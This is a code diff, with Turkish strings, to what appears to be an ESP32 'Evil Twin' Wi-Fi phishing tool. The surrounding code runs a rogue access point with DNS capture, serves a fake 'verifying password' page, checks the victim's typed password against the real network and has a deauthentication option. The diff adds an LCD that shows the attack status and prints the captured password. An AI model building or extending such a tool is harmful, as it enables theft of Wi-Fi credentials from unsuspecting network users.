@@ -2,7 +2,9 @@
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
-
+#include <Wire.h>
+#include <LiquidCrystal_I2C.h>
+LiquidCrystal_I2C lcd(0x27, 16, 2);
 typedef struct
 {
   String ssid;
@@ -63,6 +65,12 @@ String index() {
 }
 
 void setup() {
+  Wire.begin();
+  lcd.begin(16, 2);
+  lcd.backlight(); 
+  lcd.setCursor(0, 0);
+  lcd.print("Evil Twin");
+  lcd.backlight();
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -105,6 +113,19 @@ void handleResult() {
     Serial.println("Geçersiz şifre girildi!");
   } else {
     _correct = "Şifre başarıyla alındı: " + _selectedNetwork.ssid + " Şifre: " + _tryPassword;
+
+    lcd.clear();
+    lcd.setCursor(0, 0);
+    lcd.print("Şifre: ");
+    delay(2000);
+    lcd.clear();
+     lcd.setCursor(0, 0);
+     lcd.print(_tryPassword.substring(0, 16));
+      lcd.setCursor(0, 1);
+        if (_tryPassword.length() > 16) {
+    lcd.print(_tryPassword.substring(16)); // 16. karakterden sonrasını yazdır
+        }
+     
     hotspot_active = false;
     dnsServer.stop();
     int n = WiFi.softAPdisconnect (true);
@@ -227,6 +248,11 @@ void handleIndex() {
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Şifre doğrulanıyor, lütfen bekleyin...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
+      lcd.clear();
+      lcd.setCursor(0, 0);
+      lcd.print("Evil Twin Agi");
+      lcd.setCursor(0, 1);
+      lcd.print("Olusturuldu...");
       if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
       }
